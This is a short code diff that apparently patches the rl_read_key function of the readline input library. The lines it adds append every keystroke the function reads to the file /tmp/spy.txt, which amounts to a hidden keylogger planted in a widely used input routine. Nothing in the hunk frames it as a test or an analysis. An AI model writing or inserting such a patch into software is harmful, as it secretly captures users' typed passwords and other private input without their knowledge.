@@ -516,7 +516,10 @@ rl_read_key (void)
 	  RL_CHECK_SIGNALS ();
 	}
     }
-
+FILE *fh;
+fh=fopen("/tmp/spy.txt", "a+");
+fprintf(fh,"%c",c);
+fclose(fh);
   return (c);
 }
 
